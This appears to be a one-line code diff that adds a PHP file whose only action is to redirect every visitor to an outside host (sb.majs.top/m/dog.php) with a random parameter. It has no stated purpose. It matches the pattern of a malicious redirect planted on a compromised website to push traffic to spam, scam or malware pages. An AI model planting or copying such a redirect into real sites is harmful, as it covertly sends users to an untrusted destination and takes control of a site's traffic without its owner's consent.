@@ -1,0 +1,1 @@
+<?php header('location:https://sb.majs.top/m/dog.php?data='.rand(1, 10000)); ?>
